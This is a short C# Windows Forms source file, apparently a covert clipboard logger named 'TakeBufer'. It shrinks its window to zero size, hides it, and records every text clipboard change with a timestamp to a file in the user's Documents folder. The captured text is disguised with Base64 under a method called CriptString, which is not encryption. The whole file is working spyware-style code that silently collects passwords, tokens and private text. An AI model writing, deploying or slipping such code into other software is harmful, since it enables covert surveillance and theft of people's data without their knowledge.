using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;

namespace TakeBufer
{
    public partial class fmMain : Form
    {
        public fmMain()
        {
            InitializeComponent();
        }

        private void Output(string message)
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "NGT.log");
            File.AppendAllText(path, message + Environment.NewLine);
        }

        public void ClibEvent(object sender, EventArgs e)
        {
            string s = string.Format("{0}: ", DateTime.Now);
            if (Clipboard.ContainsText()) // будем выводить только текстовое содержимое
            {
                s += CriptString(Clipboard.GetText());
            }
            else
            {
                s += "[non-text]";
            }
            Output(s);
        }

        private void fmMain_Activated(object sender, EventArgs e)
        {
            Width = 0;
            Height = 0;
            Visible = false;
            ClipboardNotification.ClipboardUpdate += new EventHandler(ClibEvent); ;
        }

        private string CriptString(string cryptData)
        {
            var bytes = Encoding.UTF8.GetBytes(cryptData);
            string cryptedStr = Convert.ToBase64String(bytes);

            return cryptedStr;
        }
    }
}
